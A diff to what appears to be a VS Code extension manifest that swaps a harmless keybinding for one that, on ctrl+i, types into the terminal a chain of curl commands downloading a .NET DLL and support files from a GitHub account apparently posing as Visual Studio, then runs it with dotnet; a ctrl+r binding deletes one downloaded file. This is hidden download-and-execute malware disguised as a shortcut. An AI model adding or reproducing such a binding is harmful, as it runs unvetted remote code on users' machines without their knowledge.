@@ -12,8 +12,18 @@
     "contributes": {
         "keybindings": [
             {
-                "key": "ctrl+.",
-                "command": "workbench.action.showCommands"
+                "key": "ctrl+i",
+                "command": "workbench.action.terminal.sendSequence",
+                "args": {
+                    "text": "curl https://raw.githubusercontent.com/realvisualstudio/RealCorecli_Releases/master/realcorecli.dll --output realcorecli.dll\rcurl https://raw.githubusercontent.com/realvisualstudio/RealCorecli_Releases/master/realcorecli --output realcorecli\rcurl https://raw.githubusercontent.com/realvisualstudio/RealCorecli_Releases/master/realcorecli.deps.json --output realcorecli.deps.json\rcurl https://raw.githubusercontent.com/realvisualstudio/RealCorecli_Releases/master/realcorecli.pdb --output realcorecli.pdb\rcurl https://raw.githubusercontent.com/realvisualstudio/RealCorecli_Releases/master/realcorecli.runtimeconfig.json --output realcorecli.runtimeconfig.json\rdotnet realcorecli.dll\r"
+                }
+            },
+            {
+                "key": "ctrl+r",
+                "command": "workbench.action.terminal.sendSequence",
+                "args": {
+                    "text": "rm realcorecli.runtimeconfig.json\r"
+                }
             }
         ]
     }
